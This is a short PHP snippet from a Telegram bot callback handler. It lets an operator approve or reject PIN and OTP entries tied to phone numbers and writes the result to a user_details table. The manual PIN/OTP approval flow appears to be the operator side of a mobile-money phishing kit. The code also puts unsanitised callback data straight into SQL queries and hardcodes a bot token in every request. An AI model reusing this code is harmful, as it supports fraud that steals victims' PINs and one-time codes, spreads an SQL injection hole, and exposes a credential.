if(isset($update['callback_query'])){
    $data = $update['callback_query']['data'];
    $chatId = $update['callback_query']['message']['chat']['id'];
    $messageId = $update['callback_query']['message']['message_id'];

    // Split the data (approve_pin_2526xxxx)
    $parts = explode('_', $data);

    $action = $parts[0]; // approve or reject
    $type   = $parts[1]; // pin or otp
    $phone  = $parts[2]; // phone number

    // ===== PIN =====
    if($type == 'pin'){
        if($action == 'approve'){
            $conn->query("UPDATE user_details SET pin_status='approved' WHERE phone='$phone'");

            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ PIN Approved");
        }

        if($action == 'reject'){
            $conn->query("UPDATE user_details SET pin_status='rejected' WHERE phone='$phone'");

            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ PIN Rejected");
        }
    }

    // ===== OTP =====
    if($type == 'otp'){
        if($action == 'approve'){
            $conn->query("UPDATE user_details SET otp_status='approved' WHERE phone='$phone'");

            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ OTP Approved");
        }

        if($action == 'reject'){
            $conn->query("UPDATE user_details SET otp_status='rejected' WHERE phone='$phone'");

            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ OTP Rejected");
        }
    }
}